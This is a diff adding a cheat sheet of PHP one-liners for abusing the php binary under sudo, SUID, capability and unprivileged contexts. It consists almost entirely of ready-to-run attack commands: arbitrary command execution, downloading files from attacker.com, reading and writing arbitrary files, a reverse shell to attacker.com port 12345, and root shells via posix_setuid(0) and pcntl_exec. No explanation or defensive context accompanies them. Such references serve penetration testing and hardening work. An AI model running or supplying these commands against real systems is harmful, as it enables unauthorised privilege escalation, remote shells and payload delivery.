@@ -1,0 +1,143 @@
+php
+===
+
+Command
+-------
+
+[Sudo]
+    php -r 'echo shell_exec("/path/to/command");'
+
+[SUID]
+    php -r 'echo shell_exec("/path/to/command");'
+
+[Unprivileged]
+    php -r 'echo shell_exec("/path/to/command");'
+
+[Sudo]
+    php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+
+[SUID]
+    php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+
+[Unprivileged]
+    php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+
+[Sudo]
+    php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+
+[SUID]
+    php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+
+[Unprivileged]
+    php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+
+Download
+--------
+
+[Sudo]
+    php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
+
+[SUID]
+    php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
+
+[Unprivileged]
+    php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
+
+File read
+---------
+
+[Sudo]
+    php -r 'readfile("/path/to/input-file");'
+
+[SUID]
+    php -r 'readfile("/path/to/input-file");'
+
+[Unprivileged]
+    php -r 'readfile("/path/to/input-file");'
+
+File write
+----------
+
+[Sudo]
+    php -r 'file_put_contents("/path/to/output-file", "DATA");'
+
+[SUID]
+    php -r 'file_put_contents("/path/to/output-file", "DATA");'
+
+[Unprivileged]
+    php -r 'file_put_contents("/path/to/output-file", "DATA");'
+
+Reverse shell
+-------------
+
+[Sudo]
+    php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+
+[SUID]
+    php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+
+[Unprivileged]
+    php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+
+Shell
+-----
+
+[Capabilities]
+    php -r 'posix_setuid(0); system("/bin/sh -i");'
+
+[Sudo]
+    php -r 'system("/bin/sh -i");'
+
+[SUID]
+    php -r 'system("/bin/sh -i");'
+
+[Unprivileged]
+    php -r 'system("/bin/sh -i");'
+
+[Capabilities]
+    php -r 'posix_setuid(0); passthru("/bin/sh -i");'
+
+[Sudo]
+    php -r 'passthru("/bin/sh -i");'
+
+[SUID]
+    php -r 'passthru("/bin/sh -i");'
+
+[Unprivileged]
+    php -r 'passthru("/bin/sh -i");'
+
+[Capabilities]
+    php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+
+[Sudo]
+    php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+
+[SUID]
+    php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+
+[Unprivileged]
+    php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+
+[Capabilities]
+    php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
+
+[Sudo]
+    php -r 'pcntl_exec("/bin/sh");'
+
+[SUID]
+    php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+
+[Unprivileged]
+    php -r 'pcntl_exec("/bin/sh");'
+
+Upload
+------
+
+[Sudo]
+    php -S 0.0.0.0:80
+
+[SUID]
+    php -S 0.0.0.0:80
+
+[Unprivileged]
+    php -S 0.0.0.0:80
